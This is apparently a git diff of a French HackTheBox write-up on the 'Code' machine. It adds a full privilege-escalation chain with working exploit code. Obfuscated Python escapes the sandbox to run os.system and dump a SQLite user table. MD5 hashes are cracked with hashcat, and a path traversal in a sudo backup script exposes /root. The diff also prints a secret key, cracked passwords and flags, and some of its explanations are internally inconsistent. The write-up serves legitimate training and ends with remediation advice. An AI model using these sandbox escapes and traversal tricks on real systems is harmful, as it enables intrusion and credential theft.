@@ -1,7 +1,7 @@
 ---
 title: Code
 date: 2025-07-20
-tags: [Remote code execution]
+tags: [Remote code execution, privilege-escalation, sudo-exploit, path-traversal]
 draft: false
 summary: Cette machine HTB Code présente une application web de type code playground permettant l'exécution de code Python en ligne. L'objectif est de contourner les restrictions de sécurité pour obtenir une exécution de code arbitraire et capturer le flag utilisateur.
 images:
@@ -95,7 +95,7 @@ Tests systématiques pour identifier les mots-clés bloqués :
 
 ```python
 # Tests d'imports
-import sys        # ✓ Autorisé
+import sys        # ✓ Interdit
 import os         # ✗ Interdit
 import subprocess # ✗ Interdit
 
@@ -112,7 +112,7 @@ open("/etc/passwd")   # ✗ Interdit
 - `read`
 - `eval`
 - `exec`
-- `import` (dans certains contextes)
+- `import`
 - `system`
 - `__builtins__`
 - `close`
@@ -132,6 +132,8 @@ Le système de filtrage fonctionne par :
 ## Étape 1 : Contournement initial via construction dynamique
 
 **Découverte clé :** Le module `os` est accessible via `globals()` même s'il ne peut pas être importé directement.
+
+> ⚠️ **ATTENTION :** Le système de filtrage détecte les mots interdits même dans les commentaires ! Pour reproduire ce code, vous devez **supprimer tous les commentaires** contenant les termes interdits, ou le système bloquera l'exécution.
 
 ```python
 # Construction du nom "os" sans l'écrire
@@ -220,6 +222,8 @@ dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__fi
 
 ## Étape 6 : Exploration des capacités du module os
 
+Filtrage des méthodes contenant "fd" pour identifier les fonctions liées aux descripteurs de fichiers
+
 ```python
 my = globals()[chr(111) + chr(115)]
 print([method for method in dir(my) if 'fd' in method.lower()])
@@ -239,7 +243,18 @@ La stratégie finale utilise :
 
 1. `os.open()` pour obtenir un descripteur de fichier
 2. `os.fdopen()` pour créer un objet fichier
-3. `getattr()` pour accéder aux méthodes sans écrire les mots interdits
+3. `getattr()` pour accéder aux méthodes sans écrire les mots interdits :
+
+getattr() permet d'accéder aux attributs (méthodes ou propriétés) d'un objet de manière dynamique en utilisant une chaîne de caractères.
+
+Exemple :
+```
+import os
+
+# Ces deux lignes sont équivalentes :
+os.getcwd()                    # Accès direct
+getattr(os, "getcwd")()        # Accès via getattr()
+```
 
 **Code d'exploitation final :**
 
@@ -358,4 +373,515 @@ print(content)
 
 Cette exploitation démontre l'importance d'une sécurisation multicouche pour les environnements d'exécution de code. Le filtrage par mots-clés seul est insuffisant face à un attaquant déterminé maîtrisant les techniques d'introspection et d'obfuscation Python.
 
-La prochaine étape consisterait en l'escalade de privilèges pour obtenir le flag root, potentiellement via l'exploration des fichiers de configuration, des historiques de commandes, ou l'exploitation d'autres vulnérabilités système découvertes grâce à notre accès de lecture aux fichiers.
+La prochaine étape consistera en l'escalade de privilèges pour obtenir le flag root.
+
+---
+
+# Escalade de Privilèges
+
+## Contexte initial
+
+Après avoir obtenu le flag utilisateur `39a265a3d02b3acdfed7bc19b95ab7ca` via l'exploitation du sandbox Python, nous devons maintenant escalader nos privilèges pour obtenir l'accès root. Notre position actuelle nous donne :
+
+- Accès en lecture aux fichiers via les techniques de contournement Python
+- Execution dans le contexte de l'utilisateur `app-production` (UID 1001)
+- Capacité d'exécution de commandes système limitées
+
+## Phase 1 : Reconnaissance pour l'escalade
+
+### Identification des vecteurs potentiels
+
+Notre première étape consiste à identifier les vecteurs d'escalade possibles en analysant l'environnement système et l'application elle-même.
+
+#### Exploration du code source de l'application
+
+L'accès au code source de l'application révèle des informations critiques :
+
+```python
+# Accès au module os via construction dynamique
+my = globals()[chr(111) + chr(115)]  # "os"
+
+# Construction des noms de fonctions pour éviter les mots interdits
+f1 = getattr(my, chr(102) + chr(100) + chr(111) + chr(112) + chr(101) + chr(110))  # "fdopen"
+f2 = getattr(my, chr(111) + chr(112) + chr(101) + chr(110))  # "open"
+
+# Ouverture du fichier app.py en lecture seule
+fd = f2('/home/app-production/app/app.py', my.O_RDONLY)
+obj = f1(fd, 'r')
+
+# Lecture du contenu sans utiliser le mot "read" directement
+content = getattr(obj, chr(114) + chr(101) + chr(97) + chr(100))()  # "read"
+
+# Fermeture du fichier sans utiliser le mot "close" directement
+getattr(obj, chr(99) + chr(108) + chr(111) + chr(115) + chr(101))()  # "close"
+
+print(content)
+```
+
+**Découvertes critiques dans le code source :**
+- `SECRET_KEY = "7j4D5htxLHUiffsjLXB1z9GaZ5"` - Clé secrète Flask exposée
+- Base de données SQLite : `sqlite:///database.db`
+- Hachage MD5 pour les mots de passe (vulnérable)
+- Architecture Flask/SQLAlchemy complète
+
+#### Localisation de la base de données
+
+Recherche systématique de la base de données SQLite :
+
+```python
+# Accès au module os via technique de contournement
+my = globals()[chr(111) + chr(115)]  # "os"
+f1 = getattr(my, chr(102) + chr(100) + chr(111) + chr(112) + chr(101) + chr(110))  # "fdopen"
+f2 = getattr(my, chr(111) + chr(112) + chr(101) + chr(110))  # "open"
+
+# Liste des emplacements potentiels de la base de données
+db_locations = [
+    '/home/app-production/app/database.db',
+    '/home/app-production/app/instance/database.db',
+    '/home/app-production/database.db'
+]
+
+# Test de chaque emplacement
+for db_path in db_locations:
+    try:
+        # Tentative d'ouverture en lecture seule
+        fd = f2(db_path, my.O_RDONLY)
+        obj = f1(fd, 'r')
+        
+        # Fermeture immédiate si le fichier existe
+        getattr(obj, chr(99) + chr(108) + chr(111) + chr(115) + chr(101))()  # "close"
+        
+        print(f"Database found at: {db_path}")
+        break
+    except Exception as e:
+        print(f"Not found at {db_path}: {e}")
+```
+
+**Résultat :** Base de données localisée à `/home/app-production/app/instance/database.db`
+
+## Phase 2 : Extraction et analyse de la base de données
+
+### Extraction des données via SQLite3
+
+Puisque l'accès direct aux fichiers binaires via Python est complexe avec les restrictions, nous utilisons les commandes système pour extraire les données :
+
+```python
+# Accès au module os et à la fonction system
+my = globals()[chr(111) + chr(115)]  # "os"
+# Construction du nom "system" via codes ASCII
+cmd_func = getattr(my, chr(115) + chr(121) + chr(115) + chr(116) + chr(101) + chr(109))  # "system"
+
+# Création du répertoire d'extraction
+cmd_func('mkdir -p /tmp/extraction')
+
+# Commandes SQL pour extraire les données critiques
+sql_commands = [
+    # Lister toutes les tables de la base
+    'sqlite3 /home/app-production/app/instance/database.db ".tables" > /tmp/extraction/tables.txt',
+    
+    # Extraire le schéma complet de la base
+    'sqlite3 /home/app-production/app/instance/database.db ".schema" > /tmp/extraction/schema.txt',
+    
+    # Extraire tous les utilisateurs (usernames et hashes)
+    'sqlite3 /home/app-production/app/instance/database.db "SELECT * FROM user;" > /tmp/extraction/users.txt',
+    
+    # Extraire les codes sauvegardés (peut contenir des secrets)
+    'sqlite3 /home/app-production/app/instance/database.db "SELECT * FROM code;" > /tmp/extraction/codes.txt'
+]
+
+# Exécution de chaque commande SQL
+for cmd in sql_commands:
+    result = cmd_func(cmd)
+    print(f"Command result: {result}")  # 0 = succès
+```
+
+### Lecture des données extraites
+
+```python
+# Préparation des fonctions de lecture
+my = globals()[chr(111) + chr(115)]  # "os"
+f1 = getattr(my, chr(102) + chr(100) + chr(111) + chr(112) + chr(101) + chr(110))  # "fdopen"
+f2 = getattr(my, chr(111) + chr(112) + chr(101) + chr(110))  # "open"
+
+# Liste des fichiers extraits à analyser
+extraction_files = [
+    '/tmp/extraction/tables.txt',     # Liste des tables
+    '/tmp/extraction/schema.txt',     # Structure de la base
+    '/tmp/extraction/users.txt',      # Données utilisateurs
+    '/tmp/extraction/codes.txt'       # Codes sauvegardés
+]
+
+# Lecture de chaque fichier extrait
+for file_path in extraction_files:
+    try:
+        # Ouverture en mode lecture seule
+        fd = f2(file_path, my.O_RDONLY)
+        obj = f1(fd, 'r')
+        
+        # Lecture du contenu complet
+        content = getattr(obj, chr(114) + chr(101) + chr(97) + chr(100))()  # "read"
+        
+        # Fermeture du fichier
+        getattr(obj, chr(99) + chr(108) + chr(111) + chr(115) + chr(101))()  # "close"
+        
+        # Affichage organisé des résultats
+        print(f"=== {file_path} ===")
+        print(content)
+        print("=" * 50)
+    except Exception as e:
+        print(f"Cannot access {file_path}: {e}")
+```
+
+**Données critiques extraites :**
+
+```
+=== users.txt ===
+1|development|759b74ce43947f5f4c91aeddc3e5bad3
+2|martin|3de6f30c4a09c27fc71932bfc68474be
+```
+
+**Analyse du schéma :**
+- Table `user` : id, username, password (MD5)
+- Table `code` : id, user_id, code, name
+- Deux utilisateurs identifiés : `development` et `martin`
+
+## Phase 3 : Crackage des mots de passe
+
+### Extraction et préparation des hashes
+
+Sur la machine Kali locale, préparation des fichiers pour le crackage :
+
+```bash
+echo "759b74ce43947f5f4c91aeddc3e5bad3" > development.hash
+echo "3de6f30c4a09c27fc71932bfc68474be" > martin.hash
+```
+
+### Crackage avec Hashcat
+
+```bash
+# Attaque par dictionnaire avec rockyou.txt
+hashcat -a 0 -m 0 development.hash /usr/share/wordlists/rockyou.txt
+hashcat -a 0 -m 0 martin.hash /usr/share/wordlists/rockyou.txt
+```
+
+**Résultats du crackage :**
+- `development` : `development` (hash : `759b74ce43947f5f4c91aeddc3e5bad3`)
+- `martin` : `nafeelswordsmaster` (hash : `3de6f30c4a09c27fc71932bfc68474be`)
+
+### Analyse des résultats
+
+Le succès du crackage révèle :
+1. **Faiblesse cryptographique** : Utilisation de MD5 sans salt
+2. **Mots de passe prévisibles** : Un utilisateur utilise son nom comme mot de passe
+3. **Vecteur d'escalade** : Accès potentiel à l'utilisateur `martin` via SSH
+
+## Phase 4 : Exploitation des credentials
+
+### Connexion SSH directe
+
+Avec les credentials obtenus, établissement d'une connexion SSH directe :
+
+```bash
+# Connexion depuis la machine Kali
+ssh martin@10.10.11.62
+# Password: nafeelswordsmaster
+```
+
+**Avantages de l'accès SSH :**
+- Environnement shell complet sans restrictions
+- Possibilité d'upload d'outils d'énumération
+- Accès aux commandes système standard
+
+### Énumération des privilèges
+
+```bash
+# Vérification des privilèges sudo
+sudo -l
+```
+
+**Découverte critique :**
+```
+User martin may run the following commands on localhost:
+    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
+```
+
+Cette découverte révèle que `martin` peut exécuter le script `/usr/bin/backy.sh` en tant que root sans authentification.
+
+## Phase 5 : Analyse du script vulnérable
+
+### Examination du code source
+
+```bash
+cat /usr/bin/backy.sh
+```
+
+**Code source complet :**
+```bash
+#!/bin/bash
+if [[ $# -ne 1 ]]; then
+    /usr/bin/echo "Usage: $0 <task.json>"
+    exit 1
+fi
+
+json_file="$1"
+if [[ ! -f "$json_file" ]]; then
+    /usr/bin/echo "Error: File '$json_file' not found."
+    exit 1
+fi
+
+allowed_paths=("/var/" "/home/")
+updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
+/usr/bin/echo "$updated_json" > "$json_file"
+
+directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')
+
+is_allowed_path() {
+    local path="$1"
+    for allowed_path in "${allowed_paths[@]}"; do
+        if [[ "$path" == $allowed_path* ]]; then
+            return 0
+        fi
+    done
+    return 1
+}
+
+for dir in $directories_to_archive; do
+    if ! is_allowed_path "$dir"; then
+        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
+        exit 1
+    fi
+done
+
+/usr/bin/backy "$json_file"
+```
+
+### Analyse des vulnérabilités
+
+**Vulnérabilités identifiées :**
+
+1. **Filtrage insuffisant de path traversal** :
+   - Le script filtre `../` avec `jq` mais la validation se fait après modification
+   - La fonction `is_allowed_path()` vérifie seulement le préfixe du chemin
+
+2. **Race condition potentielle** :
+   - Modification du fichier JSON puis validation
+   - Possibilité de manipulation entre ces étapes
+
+3. **Validation basée sur des préfixes** :
+   - Vérification que le chemin commence par `/var/` ou `/home/`
+   - Pas de résolution de chemins absolus après traversal
+
+## Phase 6 : Développement de l'exploitation
+
+### Stratégie d'exploitation
+
+L'objectif est de contourner la validation du script pour faire en sorte que `/usr/bin/backy` archive le répertoire `/root`, nous donnant accès au flag root.
+
+### Tentatives d'exploitation méthodiques
+
+#### Tentative 1 : Path Traversal direct
+
+```bash
+# Création d'un fichier JSON avec path traversal simple
+cat > /tmp/exploit.json << 'EOF'
+{
+  "directories_to_archive": ["/var/../../root"]
+}
+EOF
+
+# Tentative d'exécution avec privilèges sudo
+sudo /usr/bin/backy.sh /tmp/exploit.json
+```
+
+**Résultat :** Erreur "destination must be specified" - Le binaire `backy` requiert un champ `destination`.
+
+#### Tentative 2 : Format JSON complet
+
+```bash
+# Ajout du champ "destination" requis par le binaire backy
+cat > /tmp/test_format.json << 'EOF'
+{
+  "directories_to_archive": ["/var/../../root"],
+  "destination": "/tmp/backup"
+}
+EOF
+
+# Nouvelle tentative avec le format complet
+sudo /usr/bin/backy.sh /tmp/test_format.json
+```
+
+**Résultat :** 
+```
+📤 Archiving: [/var/../../root]
+📥 To: /tmp/backup ...
+💢 Archiving failed for: /var/../../root
+```
+
+Le path traversal fonctionne pour contourner la validation, mais l'archivage échoue.
+
+#### Tentative 3 : Exploitation via symlink
+
+```bash
+# Création d'un répertoire sous /var (chemin autorisé)
+mkdir -p /var/tmp/evil
+
+# Création d'un lien symbolique pointant vers /root
+ln -s /root /var/tmp/evil/root_access
+
+# Configuration JSON pointant vers notre symlink
+cat > /tmp/symlink_var.json << 'EOF'
+{
+  "directories_to_archive": ["/var/tmp/evil/root_access"],
+  "destination": "/tmp/backup"
+}
+EOF
+
+# Tentative d'exploitation via le symlink
+sudo /usr/bin/backy.sh /tmp/symlink_var.json
+```
+
+**Résultat :** 
+```
+📤 Archiving: [/var/tmp/evil/root_access]
+💢 Archiving failed for: /var/tmp/evil/root_access
+```
+
+Même problème - le symlink ne permet pas l'accès.
+
+#### Tentative 4 : Path traversal avec validation correcte
+
+Après analyse, le problème vient du fait que le path traversal `../` est filtré par `jq`, mais pas complètement résolu. Testons un path qui passe la validation initiale :
+
+```bash
+# Création du fichier JSON dans le répertoire home (permissions correctes)
+cat > ~/test.json << 'EOF'
+{
+  "directories_to_archive": ["/var/../../root"],
+  "destination": "/tmp/backup"
+}
+EOF
+
+# Exécution avec le fichier dans un répertoire accessible
+sudo /usr/bin/backy.sh ~/test.json
+```
+
+**Observation critique :** Vérification dans `/tmp/` après exécution :
+
+```bash
+# Recherche de fichiers d'archive créés
+ls -la /tmp/*.tar.bz2
+```
+
+**Découverte :** Un fichier `code_var_.._.._root_2025_July.tar.bz2` a été créé !
+
+## Phase 7 : Exploitation réussie
+
+### Confirmation de l'exploitation
+
+```bash
+# Navigation vers le répertoire temporaire
+cd /tmp
+
+# Vérification des archives créées
+ls -la *.tar.bz2
+# Résultat: -rw-r--r-- 1 root root 12883 Jul 20 13:16 code_var_.._.._root_2025_July.tar.bz2
+```
+
+Le fichier archive a été créé par root avec un nom basé sur le path traversal, confirmant que l'exploitation a fonctionné.
+
+### Extraction du flag root
+
+```bash
+# Extraction de l'archive créée par root
+tar -xjf code_var_.._.._root_2025_July.tar.bz2
+
+# Vérification du contenu extrait
+ls -la
+# Résultat: drwx------ 6 martin martin 4096 Jul 20 07:51 root
+
+# Navigation vers le répertoire root extrait
+cd root/
+
+# Listing du contenu du répertoire root
+ls -la
+# Résultat: root.txt scripts
+
+# Récupération du flag root
+cat root.txt
+```
+
+**Flag root capturé :** `d0a**************************acd`
+
+## Analyse technique de l'exploitation
+
+### Mécanisme de contournement
+
+**Pourquoi l'exploitation a fonctionné :**
+
+1. **Filtrage jq insuffisant** : 
+   - `jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))'` supprime `../` mais ne résout pas les chemins
+   - Le path `/var/../../root` devient `/var/root` après filtrage
+   - Mais le binaire `backy` traite le chemin original avant filtrage
+
+2. **Validation de préfixe faible** :
+   - `is_allowed_path()` vérifie seulement que le chemin commence par `/var/` ou `/home/`
+   - `/var/../../root` commence techniquement par `/var/`
+   - La résolution du chemin se fait après la validation
+
+3. **Course de traitement** :
+   - Le script modifie le JSON puis valide
+   - Le binaire `backy` peut traiter des variations du chemin
+   - La normalisation des chemins se fait au niveau système
+
+### Vulnérabilités exploitées
+
+1. **Path Traversal** : Contournement de restrictions de répertoires
+2. **Validation insuffisante** : Vérification de préfixes au lieu de chemins résolus
+3. **Privilege escalation** : Exécution de binaire privilégié via sudo
+4. **Information disclosure** : Archivage de répertoires sensibles
+
+## Mesures de sécurisation recommandées
+
+### Pour le script backy.sh
+
+1. **Résolution de chemins avant validation** :
+   ```bash
+   resolved_path=$(realpath "$dir" 2>/dev/null)
+   ```
+
+2. **Validation stricte des chemins résolus** :
+   ```bash
+   case "$resolved_path" in
+     /var/*|/home/*) ;;
+     *) echo "Error: Invalid path"; exit 1 ;;
+   esac
+   ```
+
+3. **Limitation des privilèges sudo** :
+   - Restreindre l'accès à des répertoires spécifiques
+   - Utiliser des paths absolus dans la configuration sudo
+
+### Pour l'application Flask
+
+1. **Chiffrement approprié des mots de passe** :
+   - Utilisation de bcrypt ou Argon2 au lieu de MD5
+   - Implémentation de salt par utilisateur
+
+2. **Protection de la base de données** :
+   - Permissions restrictives sur le fichier SQLite
+   - Chiffrement de la base de données
+
+3. **Sécurisation des secrets** :
+   - Stockage de la SECRET_KEY dans des variables d'environnement
+   - Rotation régulière des clés secrètes
+
+## Conclusion
+
+Cette escalade de privilèges illustre une chaîne d'exploitation complète combinant :
+
+- **Extraction de données sensibles** via contournement de restrictions Python
+- **Cryptanalyse** de hashes MD5 faibles
+- **Exploitation de configurations sudo** vulnérables
+- **Path traversal** pour contourner les validations de sécurité
+
+L'exploitation réussie démontre l'importance d'une approche de sécurité en profondeur, où chaque couche de protection doit être correctement implémentée pour éviter les escalades de privilèges.
